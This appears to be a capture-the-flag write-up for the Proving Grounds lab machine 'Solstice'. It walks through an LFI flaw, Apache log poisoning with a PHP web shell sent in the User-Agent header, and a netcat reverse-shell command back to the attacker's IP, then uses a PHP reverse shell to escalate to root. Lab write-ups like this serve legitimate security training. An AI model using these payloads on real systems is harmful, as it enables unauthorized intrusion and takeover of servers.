---
title: "Proving grounds Play: Solstice"
layout: post
date: 2023-09-13 05:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        pyftpdlib 1.5.6
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.180.72:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5ba737fd556cf8ea03f510bc94320718 (RSA)
|   256 abda6a6f973fb2703e6c2b4b0cb7f64c (ECDSA)
|_  256 ae29d4e346a1b15227838f8fb0c436d1 (ED25519)
25/tcp    open  smtp       Exim smtpd
| smtp-commands: solstice Hello nmap.scanme.org [192.168.45.197], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp    open  http       Apache httpd 2.4.38 ((Debian))
2121/tcp  open  ftp        pyftpdlib 1.5.6
3128/tcp  open  http-proxy Squid http proxy 4.6
8593/tcp  open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
54787/tcp open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)

62524/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web PORT : 8593

![img](/assets/images/CTF/Proving_Grounds/Solstice/web.png)

## LFI Vulnerability

Clicking on the `Book List` button shows the `index.php?book` location.   

![img](/assets/images/CTF/Proving_Grounds/Solstice/lfi.png)

## Apache Log Poisoning attack

```text
http://192.168.180.72:8593/index.php?book=../../../../../../var/log/apache2/access.log
```

The LFI vulnerability can be exploited through the log poisoning attack. Send a php code execution payload to the server to store the payload in the log file.

```sh
curl http://192.168.180.72 -A "<?php system(\$_GET['cmd']); ?>"
```

Execute arbitrary command in the URL to verify the code execution.

```sh
http://192.168.180.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&cmd=whoami
```

Execute the below netcat command to obtain reverse shell. Ensure netcat listener is running on the desired PORT for reverse connection.

```sh
curl -s "http://192.168.180.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.197%204444%20-e%20%2Fbin%2Fbash%20"
```

![img](/assets/images/CTF/Proving_Grounds/Solstice/shell.png)

**Initial Foothold obtained**

## Privilege Escalation

### Process Enumeration

Check the running process with root permissions.

```sh
ps aux | grep root
```

![img](/assets/images/CTF/Proving_Grounds/Solstice/ps.png)

PHP is running as root, in order to get a shell as `root` the index.php file located in the `/var/tmp/sv/` folder has to be replaced with a php reverse shell.

Download the pentest monkey php reverse shell into the folder and rename it as `index.php`. Once the file is downloaded and renamed then run internal curl command to execute the php file to obtain the reverse shell.

![img](/assets/images/CTF/Proving_Grounds/Solstice/root.png)

**Root obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).